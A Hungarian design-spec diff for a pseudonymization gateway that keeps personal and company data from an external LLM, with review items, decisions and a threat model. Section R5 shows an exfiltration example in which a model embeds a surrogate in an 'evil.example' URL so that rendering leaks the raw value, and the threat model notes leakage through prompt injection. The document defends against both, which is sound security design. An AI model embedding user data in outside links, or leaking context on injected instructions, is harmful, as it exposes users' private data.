+**Mi ellen véd:**
+
+- modellszolgáltatói adatmegőrzés és esetleges tréning-felhasználás;
+- szolgáltatóoldali incidens, jogosulatlan belső betekintés, subprocesszor-lánc;
+- a modellszolgáltató naplóiba került kontextus kiszivárgása;
+- a platform saját debug/AI-hibakeresési útján történő másodlagos kitettség.
+
+**Mi ellen nem véd:**
+
+- **prompt injection** — a modell a nála lévő tartalmat kiadhatja, de az pszeudonimizált; a védelem értéke épp ez;
+- **aggregált újraazonosítás** — a §7 szerint bent maradó forgalmi számok + iparág + időszak együtt azonosíthat egy céget; ez tudatos csere az üzleti használhatóságért;
+- a felhasználó tudatos, saját kezű adatbeírása, ha a resolver nem ismeri fel (§9);
+- a nem pszeudonimizált szabad szöveg (best-effort réteg, mért recall-lal, §20);
+- csatolmányok (PDF, kép) tartalma (§17).
+
+**Elfogadott maradékkockázat:** a §9 szerinti user-input leakage. Ezt üzletileg is vállalni kell, és a termékkommunikációban nem szabad elfedni (§18).
+
+## 17. Nem célok
 
 - Teljes, visszafejthetetlen anonimizálás.
 - A forrásrendszerek access-control modelljének lemásolása.
 - Garancia arra, hogy semmilyen személyes vagy üzleti adat soha nem jut LLM-hez.
 - Minden connector összes entitásának és aliasának központi platformoldali replikálása.
 - Az üzletileg szükséges numerikus vagy kontextuális adatok automatikus elrejtése pusztán azért, mert érzékenyek lehetnek.
+- **Csatolmányok (PDF, kép) tartalmának pszeudonimizálása (R17, D5).** A szöveges transzformáció ezekre nem működik; a v1-ben rájuk a meglévő sensitivity-policy (blokk / emberi jóváhagyás) marad érvényben. OCR-alapú kiterjesztés külön fázis.
+- ML-alapú NER a v1-ben (§8).
 
-## 15. Biztonsági és termékállítás
+## 18. Biztonsági és termékállítás
 
-A termék állítása nem az, hogy „az LLM nem kap adatot", hanem hogy **az LLM csak a feladat elvégzéséhez szükséges adatot kapja meg, miközben a konfigurált azonosító és érzékeny entitásadatok determinisztikusan vagy best-effort módon tokenizálhatók**.
+A termék állítása nem az, hogy „az LLM nem kap adatot", hanem hogy **az LLM csak a feladat elvégzéséhez szükséges adatot kapja meg, miközben a konfigurált azonosító és érzékeny entitásadatok determinisztikusan vagy best-effort módon pszeudonimizálhatók**.
 
-Ez csökkenti egy modelloldali adatmegőrzés, incidens vagy jogosulatlan betekintés következményeit, miközben a pénzügyi, elemzési és operatív agent-workflow-khoz szükséges kontextus megtartható.
+Pontos, jogilag védhető megfogalmazás (R13):
 
-## 16. Javasolt implementációs sorrend
+> „A személyes adatok pszeudonimizált formában kerülnek a külső modellhez. Ez a GDPR 32. cikke szerinti megfelelő technikai intézkedés, **nem anonimizálás**: a leképezés a platform bizalmi zónájában, elkülönítve és titkosítva marad."
 
-1. Token Engine + tokenformátum + validáció.
-2. Tenant-isolated Token Vault és KMS integráció.
-3. LLM Privacy Gateway közös ki-/bemeneti pipeline.
-4. Privacy Interface Contract és CRM referenciaimplementáció.
-5. Strukturált mezőszintű tokenizáció.
-6. Detokenizáció és UI renderelés.
-7. Conversation-scoped token mapping hosszú távú megőrzéssel.
-8. User-input best-effort resolver + source-side `resolve()`.
-9. Known-value substitution és free-text scanner.
-10. OFF / OBSERVE / ENFORCE konfiguráció.
-11. Privacy observability/debug UI.
-12. AI-safe Debug Trace API ugyanazon privacy gateway használatával.
+Ez csökkenti egy modelloldali adatmegőrzés, incidens vagy jogosulatlan betekintés következményeit, miközben a pénzügyi, elemzési és operatív agent-workflow-khoz szükséges kontextus megtartható. Az LLM-szolgáltatóval kötött DPA és az adatkezelési dokumentáció ettől függetlenül szükséges.
 
-## 17. Még nyitott technikai döntések
+## 19. Implementációs sorrend — vertikális szeletek (R23)
 
-- A konkrét tokenformátum, maximális hossz és verziózási stratégia.
-- A vault fizikai technológiája, retention és garbage collection szabályai.
-- Conversation törlés, source entity törlés és adatmegőrzési szabályok kapcsolata a mappingekkel.
-- A candidate extraction első verziójának technológiája: szabályok, könnyű NER, lokális modell vagy kombináció.
-- Confidence thresholdok és többértelmű entity resolution UX.
-- Fail-open/fail-closed policy pontos konfigurációja.
-- Connector privacy capability-k minimális kötelező szintje és verziózása.
-- Mérőszámok: tokenizációs recall/precision, workflow failure rate, latency overhead, token validation errors.
+A v0.1 rétegenkénti sorrendje helyett végponttól végpontig futó szeletek, hogy minden mérföldkő demózható és mérhető legyen.
 
-## 18. Elfogadási kritériumok az első verzióhoz
+**M1 — vertikális MVP (D5).**
+- Saját CRM connector + **egyetlen entitástípus: `company`**.
+- Surrogate Engine + vault (ref-surrogate; val-surrogate még nem kell).
+- Strukturált tool-output pszeudonimizáció (§7), a contract-validáció után.
+- Tool-argumentum feloldás a brokerben (§10.1).
+- Web UI feloldás, streaming-biztos (§10.2, §10.4) + renderelési szabály (§10.3).
+- OBSERVE mód + audit + alap observability.
+- Egy agenten, egy tenanton.
+
+**M2 — policy és összevonás.**
+- Kategória-policy (`allow|tokenize|local_only|block`) platform → tenant → agent hierarchiával.
+- ENFORCE mód; a mai `allow_sensitive_external_model` migrációja.
+- A sensitivity-routerrel közös végrehajtási sorrend (§2), regressziós fedéssel.
+- Admin UI + dry-run teszter.
+
+**M3 — szabad szöveg és user input.**
+- Known-value substitution magyar toldalék-tűrő illesztéssel (§8).
+- User-input resolver + connector `resolve()` contract (§9, §11).
+- val-surrogate + per-conversation adatkulcs + crypto-shredding (§6).
+
+**M4 — kiterjesztés.**
+- Debug-trace projection (§12), privacy observability UI (§14).
+- Egress-mátrix a csatornákra (§10.2), memória-chunk lefedés (§12).
+- További entitástípusok és connectorok, capability-verziózás.
+
+## 20. Elfogadási kritériumok és mérőszámok
+
+### Funkcionális kritériumok (v1 / M1–M2)
 
 - Egy privacy metadata-val jelölt strukturált mező nyers értéke ENFORCE módban nem kerül az LLM requestbe.
-- Az LLM ugyanazt a tokent konzisztensen használhatja egy conversation/trace scope-on belül.
-- A user a trusted UI-ban detokenizált, természetes outputot kap.
-- Az LLM nem rendelkezik olyan tool-lal, amely saját contextje számára nyers tokenértéket ad vissza.
-- OBSERVE módban a rendszer a workflow módosítása nélkül megmutatja, mit tokenizált volna.
+- Az LLM ugyanazt az álnevet konzisztensen használhatja egy conversation/trace scope-on belül; újrafuttatás után is ugyanazt kapja (R19).
+- A modell által kitalált álnév nem oldható fel, és auditált eseményt ír (§5).
+- Tool callban visszaadott álnév a connector-hívás előtt feloldódik, és a nyers érték nem kerül vissza a modell contextjébe (§10.1).
+- A user a trusted UI-ban feloldott, természetes outputot kap; külső csatornán az egress-mátrix érvényesül (§10.2).
+- URL-be/kódblokkba ágyazott álnév nem oldódik fel (§10.3) — red-line regressziós teszttel.
+- Streamelt válaszban töredék álnév soha nem jelenik meg (§10.4).
+- OBSERVE módban a rendszer a workflow módosítása nélkül megmutatja, mit pszeudonimizált volna.
 - Agentenként ki-/bekapcsolható a funkció.
-- AI debugging esetén a raw log helyett tokenizált projection küldhető az LLM-nek.
+- AI debugging esetén a raw log helyett pszeudonimizált projection megy a modellnek.
 - Privacy Interface nélküli connector továbbra is használható, de a platform egyértelműen alacsonyabb privacy capability-t kezel.
 
----
+### Mérőszámok (R22)
 
-# A. melléklet — Review és javasolt módosítások (v0.2 tervezet, jóváhagyásra vár)
-
-A review a v0.1 koncepciót a platform **jelenlegi kódjához** mérte. A javaslatok jelölése:
-`[BLOKKOLÓ]` = implementáció előtt tisztázandó, különben rossz architektúrához vezet · `[FONTOS]` = a v1 hatókörét vagy biztonságát érdemben javítja · `[PONTOSÍTÁS]` = megfogalmazás/összhang.
-
-## A.0 Kiindulás: mi van már ma a kódban
-
-A spec zöldmezős rendszerként ír le egy privacy-réteget, de a platformban **már fut egy privacy-döntéspont** ugyanazon a hívásláncon:
-
-| Meglévő elem | Hol | Mit csinál ma |
-|---|---|---|
-| `inspectPromptSensitivity` / `classifyPrompt` | `app/src/domain/gateway/sensitivity-router.ts` | determinisztikus, regex+checksum (Luhn, IBAN mod-97) osztályozás: `clean` / `sensitive` / `forbidden`, pozícióval és maszkolt snippettel |
-| Policy-végrehajtás | `app/src/domain/gateway/model-gateway.ts` | `sensitive` → helyi modellre kényszerít (ma fail-closed, ha nincs helyi modell); `forbidden` → blokk + `model.call.denied` audit + emberi override |
-| Per-agent felmentés | `agents.allow_sensitive_external_model` | mindent-vagy-semmit kapcsoló, csak a `sensitive` szintre |
-| Kimenő redakció | `redactSensitiveText`, `StreamingSensitiveTextRedactor` | reasoning-trace és debug-export maszkolása (**egyirányú**, nem visszafejthető) |
-| Nyitott átdolgozás | `docs/specs/sensitivity-router-redesign-spec.md` | kategória-szintű policy, tenant-célmodell, admin UI, `system`-üzenetek kérdése |
-| Rokon ötlet-issue | #189 | reverzibilis maszkolás a `SensitivityFinding` spanekre, futásidejű memóriában tartott leképezéssel |
-
-**Következmény:** a Privacy Gateway nem új, párhuzamos réteg, hanem a meglévő sensitivity-router **negyedik policy-akciója**. Ezt a spec §1–2-ben ki kell mondani.
-
-## A.1 Blokkoló pontosítások
-
-### R1 `[BLOKKOLÓ]` Viszony a meglévő sensitivity routerhez
-
-Javaslat: a policy kategóriánként (`email`, `person`, `company`, `taj`, `adoszam`, `pan`, `iban`, `secret_key`, …) egy akciót ad:
-
-```
-allow | tokenize | local_only | block
-```
-
-Sorrend a gateway-ben: **tokenizáció fut előbb**, az osztályozó a már tokenizált szövegen dönt. Ennek két haszna van:
-1. nem keletkezik két, egymással versengő privacy-döntéspont;
-2. megoldja a redesign-spec P5 UX-problémáját (egyetlen e-mail-cím ma véglegesen „sensitive"-be billenti a beszélgetést; tokenizálva már nem).
-
-A `secret_key` (privát kulcs, API token) **soha nem tokenizálható** — ott a maszkolásnak nincs üzleti értelme, marad `block`.
-
-### R2 `[BLOKKOLÓ]` A vault kétféle tokent tároljon, ne egy PII-másolatot
-
-A v0.1 „token vault"-ja implicit egy **második másolatot** hoz létre a személyes adatból. Javaslat:
-
-| Token-osztály | Mit tárol | Mikor |
-|---|---|---|
-| **ref-token** | csak `(tenantId, connectorId, entityType, sourceId)` referencia — **nyers érték nélkül** | ha a connector ad stabil source ID-t (§5 fő eset) |
-| **val-token** | titkosított értékmásolat (tenant-kulcs, per-conversation adatkulcs) | csak ha nincs source ID (szabad szöveges NER-találat) |
-
-Haszon: a ref-token nem növeli a PII-felületet, és a forrásoldali törlés automatikusan átüt a detokenizáláson (GDPR-törlési jog). A val-token per-conversation adatkulccsal **crypto-shredding**-gel törölhető.
-
-### R3 `[BLOKKOLÓ]` Hiányzik a detokenizáció a tool-hívás irányában
-
-A §8 csak a felhasználó felé mutató detokenizációt írja le. De ha az LLM tool callban adja vissza a tokent — `get_revenue(company="[[AITOK:v1:COMPANY:X7K2]]")` —, akkor a platformnak a connector-hívás **előtt**, szerveroldalon fel kell oldania. Enélkül minden tokenizált entitáson elhasal a tool-hívás.
-
-Javasolt invariáns: **detokenizáció pontosan két helyen történhet** — (1) tool-argumentum feloldás a Tool Brokerben (`ToolBrokerService.invoke` előtt), (2) végső renderelés a trusted felületen. Sehol máshol, és soha nem az LLM kérésére.
-
-### R4 `[BLOKKOLÓ]` „Trusted UI" ma nem az egyetlen kimenet
-
-A spec a detokenizációt a „trusted UI"-hoz köti, a platform azonban más csatornákon is kiad szöveget: **Telegram-csatorna** (`app/src/domain/channel/`), platform e-mail-értesítés, ticket-komment, riport/export fájl, debug-log export. Ezek egy része a bizalmi határon **kívülre** megy.
-
-Javaslat: per-egress detokenizációs mátrix, alapértelmezettekkel:
-
-| Egress | Detokenizáció |
-|---|---|
-| Web UI (bejelentkezett, tenant-scope) | teljes |
-| Telegram / külső csatorna | policy szerint, alapból **nem** (vagy csak `company` szintű, `person`/`email` nem) |
-| Platform e-mail-értesítés | alapból nem |
-| Export / riport fájl | policy szerint, auditált |
-| Debug-log export | soha |
-
-### R5 `[BLOKKOLÓ]` Detokenizációs exfiltráció renderelés közben
-
-Ha a modell a tokent URL-be, kép-hivatkozásba vagy linkbe ágyazza (`https://evil.example/?c=[[AITOK:...]]`), a naiv „cseréld vissza a végén" logika a **nyers értéket teszi be egy aktív linkbe** — a felhasználó kattintása vagy egy auto-betöltő kép kiviszi az adatot. Ez a tokenizáció bevezetésével keletkező **új** támadási út.
-
-Szabály: detokenizáció csak szöveg-node-ban; URL-ben, markdown-link célban, HTML-attribútumban és kódblokkban a token **jelölve marad** (vagy a válasz megjelölésre kerül). A markdown-renderelő sanitizálása előfeltétel.
-
-### R6 `[FONTOS]` Ütközés a tool-output contract runtime-mal
-
-A platformnak van szigorú tool-output validációja (`app/src/domain/contract-runtime/`). Egy `email` formátumú mezőbe tett `[[AITOK:…]]` **elbukik a séma-validáción**, illetve elronthatja a downstream JSON-parszolást.
-
-Javaslat: a tokenizáció a contract-validáció **után**, közvetlenül a modell-hívás előtt fusson; a contract-runtime a tokenizált mezőkre formátum-constraintet ne kényszerítsen; a token mindig string-mezőben marad (numerikus/dátum mezőt nem tokenizálunk — ott `pass` vagy `block`).
-
-### R7 `[FONTOS]` Prompt-cache interakció
-
-A platform prompt cache-t és cache-breakpointokat használ (`prompt-cache.ts`, két meglévő feature-spec). Conversation-scoped token + megosztott, cache-elt prefix (skill-szöveg, memória-blokk) együtt cache-szennyezést és rossz feloldást okoz.
-
-Invariáns: tokenizált tartalom **csak a cache-határ utáni, nem megosztott szegmensbe** kerülhet.
-
-### R8 `[FONTOS]` Streaming detokenizáció
-
-A válasz SSE-deltákban érkezik, a token karakterei **több delta között szétszakadhatnak** — ugyanaz a probléma, amit a `StreamingSensitiveTextRedactor` már megold puffereléssel. A detokenizálónak ugyanezt a mintát kell követnie (lookahead a token-nyitó `[[`-ra, teljes token-határig visszatartás), különben töredék tokenek jelennek meg a felhasználónak.
-
-## A.2 Architektúra- és tartalmi javaslatok
-
-### R9 `[FONTOS]` Opaque token helyett típusos, rövid pszeudonim
-
-A `[[AITOK:v1:COMPANY:X7K2...]]` három bajt okoz: (a) a modell elveszíti az entitás szemantikáját (hogy a „SPAR" kiskereskedelmi lánc), (b) a véletlen karakterlánc sok BPE-tokent eszik (költség + kontextus), (c) rontja az olvashatóságot a debug-nézetben.
-
-Javaslat: **`[[COMPANY_1]]`, `[[PERSON_2]]`** típus + beszélgetésen belüli sorszám, a hitelesség HMAC-cel a vault oldalán ellenőrizve (nem a token szövegében). Opcionális, policy-vezérelt „kontextus-hint" (`COMPANY_1 = kiskereskedelmi lánc, HU`) — ez tudatos csere: kicsit több kontextus-szivárgás jobb válaszminőségért. → **D1**
-
-### R10 `[FONTOS]` Token-hitelesség és névtér
-
-Definiálandó: `(tenantId, conversationId, entityRef) → surrogate` bijektív; a feloldás kulcsa a surrogate + conversation scope. A „modell által kitalált token nem oldható fel" (§4) csak akkor teljesül, ha a feloldás **kizárólag a vault-találaton** múlik (nem a token alakján), és a nem talált token audit-eseményt ír (`privacy.token.unknown`).
-
-### R11 `[FONTOS]` Magyar nyelvi illesztés a known-value substitutionnél
-
-A §6/2. szint exact-matchnek tűnik, de magyarul az entitásnév ragozódik: *SPAR-nak, SPAR-ral, Sparnál, a Sparban*. A v1-hez javasolt: normalizált (ékezet- és kisbetű-tűrő) illesztés + toldalék-tolerancia, Aho–Corasick szótár-illesztéssel a tenant entitásnevein. **ML-alapú NER nélkül** — ez determinisztikus, olcsó és auditálható, összhangban a Sensitivity-Router spec „nulla LLM-token" elvével. → **D4**
-
-### R12 `[FONTOS]` Latency- és méret-korlátok
-
-A tokenizáció a kritikus úton van, nagy tool-válaszoknál (több ezer soros CRM-lista) érzékelhető. Javasolt célérték a specbe: **p95 ≤ 50 ms / 100 KB szöveg**, batch vault-írás fordulónként egy tranzakcióban, és timeout-szabály:
-
-- strukturált, jelölt mező → **fail-closed** (inkább hibázzon a hívás, mint hogy nyersen menjen ki),
-- szabad szöveges scanner → **fail-open** + audit.
-
-Ez konkretizálja a §13 utolsó pontját és a §17 fail-open kérdését.
-
-### R13 `[FONTOS]` GDPR-megfogalmazás (a §15 jogilag pontatlan)
-
-A tokenizáció **pszeudonimizálás** (GDPR 4. cikk 5. pont), nem anonimizálás: a tokenizált adat **továbbra is személyes adat**, a mapping pedig a „kiegészítő információ", amit elkülönítve és védve kell tartani. Az LLM-szolgáltatóval kötött adatfeldolgozói szerződés (DPA) és a rekord-nyilvántartás **nem váltható ki** ezzel a réteggel — a tokenizáció a *kockázatot* csökkenti, nem a jogalapot.
-
-A §15 javasolt szövege: „…a személyes adatok pszeudonimizált formában kerülnek a külső modellhez; ez a GDPR 32. cikke szerinti megfelelő technikai intézkedés, nem anonimizálás."
-
-### R14 `[FONTOS]` A „nincs token-access-control" technikai minimuma
-
-A §8 termékdöntése rendben van, de kell egy technikai minimum-invariáns, különben a token IDOR-szerű oldalút lesz: feloldás **csak** (a) azonos tenant, (b) azonos conversation/trace scope, (c) a kérő felhasználó a beszélgetés jogosult résztvevője esetén. Vagyis: nem építünk új jogosultsági modellt, de a vault-lookup nem lehet globálisan címezhető.
-
-### R15 `[FONTOS]` Retention és törlés a meglévő modellekre kötve
-
-A §17 nyitott kérdése megválaszolható a már meglévő sémával: `RetentionPolicy`, `Conversation.retainUntil`, `Conversation.legalHold`, `Message.contentDeletedAt`. Javaslat: a mapping élettartama a beszélgetés retention-jét kövesse; beszélgetés törlésekor a per-conversation adatkulcs törlődik (crypto-shredding) → a val-tokenek visszafejthetetlenné válnak, a ref-tokenek pedig eleve nem tárolnak értéket.
-
-### R16 `[PONTOSÍTÁS]` Terminológia: a „token" szó foglalt
-
-A kódbázisban a „token" már négy dolgot jelent (LLM-token / `model_calls.prompt_tokens`, `WriteGateToken`, `ChannelLinkToken`, OAuth-token). Javaslat: a privacy-oldali entitás neve **surrogate** (magyarul „álnév"), a leképezés `surrogate_map`, a modul `privacy-surrogate`. Most olcsó átnevezni, később drága.
-
-### R17 `[PONTOSÍTÁS]` Nem szöveges modalitások explicit scope-ja
-
-A platform PDF-et és képet is küld a modellnek (chat-csatolmány, tulajdoni lap feldolgozás). Ezekre a szöveges tokenizáció nem működik. A spec §14 (Nem célok) egészüljön ki: „csatolmányok (PDF, kép) tartalmának tokenizálása nem cél a v1-ben; ezekre a meglévő sensitivity-policy (blokk / jóváhagyás) marad érvényben." → **D5**
-
-### R18 `[PONTOSÍTÁS]` Tárolás nyersen, tokenizáció a határon
-
-Ki kell mondani, hogy a `messages` / tool-call rekordok a trusted zónában **nyersen** tárolódnak, és a tokenizáció minden fordulóban a kimenő határon fut újra (entitástérkép-cache-sel). Ez a következetes olvasata a §10-nek („a platform megtarthat teljes, nyers logokat"), és elkerüli, hogy a tárolt előzmény tokenizált, feloldhatatlan formában ragadjon be.
-
-### R19 `[PONTOSÍTÁS]` Idempotencia újrafuttatásnál
-
-A leképezés **perzisztens** legyen, ne csak futásidejű memóriában (szemben a #189 javaslatával): a ticket-retry, agent-turn resilience és a beszélgetés újranyitása ugyanazt a surrogate-ot kell hogy adja ugyanarra az entitásra, különben az előzményben lévő korábbi surrogate-ok feloldhatatlanná válnak.
-
-### R20 `[PONTOSÍTÁS]` Komponensnevek a valós modulokra mutassanak
-
-A §2 ábra fantázianevei helyett a meglévő modulokra érdemes hivatkozni: `ModelGateway.call()`, `ToolBrokerService.invoke()`, `chat-tool-loop`, `channel-*` adapterek, `contract-runtime`. Így a spec olvasható marad fejlesztőnek is.
-
-### R21 `[FONTOS]` Hiányzó fejezet: fenyegetésmodell és maradékkockázat
-
-A spec nem mondja ki, **mi ellen** véd. Javasolt új fejezet:
-
-- **Véd:** modellszolgáltatói adatmegőrzés/tréning-felhasználás, szolgáltatói incidens vagy jogosulatlan betekintés, subprocesszor-lánc, log-kiszivárgás a modell oldalán.
-- **Nem véd:** prompt injection általi kontextus-kiszivárgás (a modell a nála lévő tokenizált adatot bármikor kiadhatja — de az tokenizált), aggregált újraazonosítás (a §5 szerint bent maradó forgalmi számok + iparág + időszak együtt azonosíthat egy céget), a felhasználó saját, tudatos adatbeírása, a nem tokenizált szabad szöveg (best-effort réteg).
-- **Maradékkockázat:** a §7 szerint elfogadott user-input leakage; ezt üzletileg is vállalni kell.
-
-### R22 `[FONTOS]` Mérhető elfogadási kritériumok
-
-A §18 kritériumai jók, de nem mérhetők. Javasolt kiegészítés (a meglévő `Eval` / `EvalRun` és `prompt-eval-red-lines` keretre építve):
+A meglévő `Eval` / `EvalRun` modellekre és a `prompt-eval-red-lines` keretre építve:
 
 | Metrika | Cél v1-ben |
 |---|---|
 | Strukturált, jelölt mező recall | 100% (definíció szerinti, teszttel bizonyítva) |
 | Szabad szöveges recall (címkézett magyar mintán) | ≥ 80% |
-| False positive ráta (tokenizált, de nem védendő) | ≤ 5% |
+| False positive ráta (pszeudonimizált, de nem védendő) | ≤ 5% |
 | Latency overhead (p95, teljes forduló) | ≤ 80 ms |
-| Workflow failure rate változása OBSERVE→ENFORCE | ≤ +1% |
-| Válaszminőség-romlás tokenizált prompton (eval-szett) | ≤ 5% |
+| Workflow failure rate változása OBSERVE → ENFORCE | ≤ +1% |
+| **Válaszminőség-romlás pszeudonimizált prompton (eval-szett)** | ≤ 5% |
+| Ismeretlen/érvénytelen álnév aránya a modell outputjában | ≤ 1% |
 
-Az utolsó sor fontos: **a tokenizáció ronthatja a modell válaszminőségét**, ezt mérni kell, nem feltételezni.
+Az utolsó előtti sor kiemelten fontos: a pszeudonimizáció **ronthatja a modell válaszminőségét** — ezt mérni kell, nem feltételezni. Ez dönti el a §5 kontextus-hint bekapcsolását is.
 
-### R23 `[FONTOS]` Vertikális MVP a §16 sorrend helyett
+## 21. Eldöntött kérdések és még nyitott technikai részletek
 
-A javasolt 1–3. lépés (Token Engine, vault, pipeline) önmagában nem szállít demózható értéket. Javaslat: **vékony, végponttól végpontig futó szelet** először —
+### Eldöntve (2026-08-19)
 
-**M1 (vertikális MVP):** saját CRM connector + **egyetlen entitástípus (`company`)** + strukturált tool-output tokenizáció + tool-arg detokenizáció + web UI detokenizáció + OBSERVE mód + audit. Egy agenten, egy tenanton.
-**M2:** kategória-policy (allow/tokenize/local_only/block) + ENFORCE + admin UI + a sensitivity-router összevonás (R1).
-**M3:** known-value substitution + magyar illesztés + user-input resolver + `resolve()` contract.
-**M4:** debug-trace projection, observability UI, csatorna-mátrix (R4), több connector.
+| # | Kérdés | Döntés |
+|---|---|---|
+| **D1** | Álnév formátuma | Típusos, rövid, sorszámozott: `[[COMPANY_1]]`. Kontextus-hint opcionális, alapból ki (§5). |
+| **D2** | Vault-modell | Kettős: ref-surrogate ahol van source ID, val-surrogate csak szabad szövegre (§6). |
+| **D3** | Külső csatornán feloldunk-e | Entitástípusonként; `person` / `email` / `account` alapból nem (§10.2). |
+| **D4** | Memória-chunkok pszeudonimizálása | Igen — a `system`-üzenetként injektált memória is a transzformáción megy át (§12). |
+| **D5** | v1 hatókör | Saját CRM + `company` entitástípus, vertikális MVP (§19/M1). |
+| **D6** | Issue #189 sorsa | Beolvad ebbe (#272); a #189 a val-surrogate speciális esete, de perzisztens mappinggel. |
 
-## A.3 Nyitott döntések (ezekre kérek választ)
+### Még nyitott (implementáció közben eldöntendő)
 
-| # | Kérdés | Opciók | Javaslatom |
-|---|---|---|---|
-| **D1** | Opaque token vagy típusos pszeudonim + kontextus-hint? | (a) `[[AITOK:v1:COMPANY:X7K2]]` (b) `[[COMPANY_1]]` (c) `[[COMPANY_1]]` + típus-hint | (b), a hint opcionálisan policy-vel |
-| **D2** | A vault referenciát tárol vagy titkosított értéket? | (a) csak érték (b) csak referencia (c) kettős (R2) | (c) |
-| **D3** | Külső csatornán (Telegram, e-mail) detokenizálunk? | (a) igen (b) nem (c) entitástípusonként | (c), alapból „nem" a `person`/`email` típusra |
-| **D4** | A memória-chunkok (ma `system` üzenetként injektálva, a redesign-spec P4/D3-a) tokenizálódnak? | (a) igen (b) nem (c) csak ENFORCE-ban | (a) — különben marad a mai osztályozatlan rés |
-| **D5** | v1 hatókör: csak saját CRM + `company`? | (a) igen (R23/M1) (b) több entitástípus rögtön | (a) |
-| **D6** | Az issue #189 (reverzibilis maszkolás) beolvad ebbe, vagy külön él tovább? | (a) beolvad (b) marad külön, mint a regex-alapú útvonal | (a) — #189 a val-token speciális esete |
+- A vault fizikai technológiája (külön tábla + KMS-envelope vs. dedikált secret store) és a garbage collection járat ütemezése.
+- A magyar toldalék-lista pontos terjedelme és a szótár-frissítés (connector-oldali entitásnév-szinkron) ütemezése.
+- Confidence thresholdok a `resolve()` találatoknál és a többértelmű entity resolution UX-e (kérdezzen vissza vagy hagyja nyersen?).
+- A kategória-policy tárolási helye: `PlatformSetting` kulcs vs. dedikált tábla (a redesign-spec D1-e ugyanez) — a mintakészlet verziózása auditálandó.
+- A `local_only` célmodell tenant-szintű választhatósága és elnevezése (`sensitiveTarget`), a redesign-spec P3 szerint.
+- Az egress-mátrix felületi konfigurálhatósága (tenant admin vs. superadmin).
+
+## 22. Változásnapló — v0.1 → v0.2
+
+| Review-tétel | Hova került |
+|---|---|
+| R1 — a sensitivity-router negyedik akciója, végrehajtási sorrend | §2 (új fejezet) |
+| R2 — ref/val surrogate kettősség | §6 |
+| R3 — tool-argumentum feloldás | §10.1 |
+| R4 — egress-mátrix (Telegram, e-mail, export, log) | §10.2 |
+| R5 — renderelési exfiltráció (URL/attribútum/kódblokk) | §10.3 |
+| R6 — contract-runtime sorrend és típus-szabályok | §7 |
+| R7 — prompt-cache invariáns | §12 |
+| R8 — streaming feloldás pufferelése | §10.4 |
+| R9 — típusos, rövid álnév + opcionális kontextus-hint | §5, D1 |
+| R10 — névtér, HMAC-hitelesség, kitalált álnév | §5 |
+| R11 — magyar toldalék-tűrő illesztés, ML-NER nélkül | §8 |
+| R12 — latency-budget és fail-closed/fail-open mátrix | §15 |
+| R13 — GDPR: pszeudonimizálás, nem anonimizálás | §1, §18 |
+| R14 — feloldási scope-invariáns (tenant + conversation + résztvevő) | §10.5 |
+| R15 — retention a meglévő modellekre kötve, crypto-shredding | §6 |
+| R16 — terminológia: surrogate / álnév | §5 |
+| R17 — csatolmányok (PDF, kép) explicit nem cél | §17 |
+| R18 — nyers tárolás, transzformáció a határon | §12 |
+| R19 — perzisztens mapping (retry, újranyitás) | §5 |
+| R20 — valós modulnevek az architektúrában | §3 |
+| R21 — fenyegetésmodell és maradékkockázat | §16 (új fejezet) |
+| R22 — mérhető kritériumok, válaszminőség-mérés | §20 |
+| R23 — vertikális MVP-vágás (M1–M4) | §19 |
